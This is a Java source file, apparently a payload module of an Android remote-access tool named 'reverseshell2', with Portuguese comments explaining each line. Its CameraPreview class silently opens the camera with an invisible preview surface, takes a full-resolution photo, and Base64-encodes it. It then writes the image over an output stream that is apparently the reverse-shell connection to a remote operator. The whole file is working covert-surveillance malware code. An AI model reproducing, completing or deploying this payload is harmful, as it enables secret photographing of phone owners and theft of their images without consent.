package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Log;

import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import java.util.List;


public class CameraPreview {
    //objeto do tipo camera
    private Camera camera;
    //objeto do tipo context. context é usado para interagir com sistema android
    private Context context;
    // outputStream é uma classe abstrata que representa um fluxo de saída de bytes. É frequentemente usada para gravar dados em arquivos ou sockets de rede.
    private OutputStream out;
//instrução de registo para identificar mensagens relacionadas a classe 
static String TAG = "cameraPreviewClass";

//construtor
    public CameraPreview(Context context) {
        try {
            this.context =context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startUp(int cameraID, OutputStream outputStream) {
        //provavelmente usará para enviar a img
        this.out = outputStream;
        try{//tentando abrir a camera com o id que foi passado po parâmetro
        camera = Camera.open(cameraID);
        }catch (RuntimeException e){
            e.printStackTrace();
            try {//se não conseguir abrir retorna o erro "end123"
                out.write("END123\n".getBytes("UTF-8"));
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        //pegando parâmetros da camera
        Camera.Parameters parameters = camera.getParameters();

        //Busca todos os tamanhos de imagem suportados pela câmera.
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        //pegando o maior tamanho da imagem
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }
        //pegando o maior tamanho da imagem
        parameters.setPictureSize(size.width, size.height);
        //aplicando configuração da camera
        camera.setParameters(parameters);
        
        try {//tentando inicializar a vizualização da camera 
        camera.setPreviewTexture(new SurfaceTexture(0));
        camera.startPreview();
        } catch (Exception e) {//se der erro mostra
            e.printStackTrace();
        }
        //capturando a foto
        camera.takePicture(null, null, new Camera.PictureCallback() {
            //
            @Override//quando a foto for tirada
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();//checagem da camera
                sendPhoto(data);//envia a imagem.
            }
        });
    }

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();//Cria um fluxo de dados temporário para armazenar a imagem comprimida.
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);//Converte os dados brutos da imagem (data) em um objeto Bitmap.
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);//Comprime a imagem em formato JPEG com qualidade de 80% e a armazena no fluxo de dados bos.
        byte[] byteArr = bos.toByteArray();//Obtém os bytes da imagem comprimida do fluxo de dados.
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);//Codifica os bytes da imagem em uma string Base64.
        Thread thread = new Thread(new Runnable(){//Cria uma nova thread para realizar o envio da imagem, evitando travar a thread principal da aplicação.
                @Override
                public void run() {
                    try {//Tenta escrever a imagem codificada e um marcador de fim ("END123\n") no fluxo de saída out.
                        out.write(encodedImage.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (Exception e) {//se ocorrer erro é registrado
                        Log.e(TAG, e.getMessage());
                    }
                }
            });
            thread.start();//inicia a execução da thread criada na função sendPhoto.
    }

    private void releaseCamera() {
        if (camera != null) {//verifica se a variável camera tem referência a uma camera aberta para poder liberar os recursos.
            camera.stopPreview();//para a exibição da vizualização da camera
            camera.release();//Libera os recursos de hardware da câmera, tornando-a disponível para outros aplicativos ou processos.
            camera = null;//desasocia a variável de alguma camera aberta.
        }
    }
}